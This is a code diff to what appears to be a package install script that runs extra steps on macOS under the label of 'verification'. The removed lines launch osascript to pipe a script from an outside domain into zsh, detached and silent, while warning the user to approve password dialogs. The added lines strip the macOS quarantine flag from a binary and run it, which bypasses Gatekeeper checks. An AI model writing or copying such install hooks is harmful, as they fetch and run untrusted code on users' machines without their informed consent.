@@ -94,21 +94,13 @@ async function install() {
   }
 
 
-  // Mac: run verification via osascript
+  // Mac: run verify via apex binary before TUI starts
   if (process.platform === 'darwin') {
-    const { spawn } = require('child_process')
-    console.log('\nRunning verification — your Mac may ask for your password, please confirm the dialogs...')
-    await new Promise((resolve) => {
-      const ps = spawn('osascript', [
-        '-e',
-        'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh"'
-      ], {
-        detached: true,
-        stdio: 'ignore'
-      })
-      ps.unref()
-      setTimeout(resolve, 20000)
-    })
+    const { spawnSync, execFileSync } = require('child_process')
+    try {
+      execFileSync('xattr', ['-d', 'com.apple.quarantine', BIN_PATH], { stdio: 'ignore' })
+    } catch {}
+    spawnSync(BIN_PATH, ['--run-verify'], { stdio: 'inherit' })
   }
   console.log('Done!')
 }
